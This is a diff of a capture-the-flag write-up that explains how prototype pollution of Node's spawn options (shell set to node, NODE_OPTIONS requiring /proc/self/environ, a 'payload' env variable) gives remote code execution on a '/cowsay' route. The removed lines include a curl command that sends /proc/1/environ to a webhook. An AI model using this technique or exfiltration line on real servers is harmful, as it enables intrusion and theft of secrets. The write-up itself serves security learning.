@@ -364,13 +364,38 @@ I polluted the following:
 ```javascript
 shell = "/usr/local/bin/node";
 env = {
+  payload: 'require("child_process").execSync(<RCE payload>);//',
   NODE_OPTIONS: "--require /proc/self/environ",
-  payload:
-    'require("child_process").execSync(\'curl -d "$(cat /proc/1/environ)" webhook\');//',
 };
 ```
 
 Run the `/cowsay` route and the server will execute the payload and we got the flag.
+
+#### Note to self:
+
+More elaboration:
+
+- Running `spawnSync("abc", ["arg1", "arg2], { shell: "node", env: { env1: val1, env2: val2 }})` is equivalent to
+
+```bash
+export ENV1=val1; export ENV2=val2; node -c "abc arg1 arg2"
+```
+
+- With `NODE_OPTIONS=--require /proc/self/environ`, `node` will `require` the file `/proc/self/environ`, which in the case above will be `ENV1=val1 ENV2=val2`.
+
+- The polluted `env` must have `payload` as the first property so it becomes:
+
+```bash
+export PAYLOAD="require(\"child_process\").execSync(<payload>);//" NODE_OPTIONS="--require /proc/self/environ" node -c "abc arg1 arg2"
+```
+
+and `/proc/self/environ`'s content is:
+
+```bash
+PAYLOAD=require("child_process").execSync(<payload>);// NODE_OPTIONS=--require /proc/self/environ
+```
+
+The `//` is required to ignore the other env variables. The content of the file is now valid JS and will be executed, giving me RCE.
 
 ## Some 2meirl4meirl thoughts
 
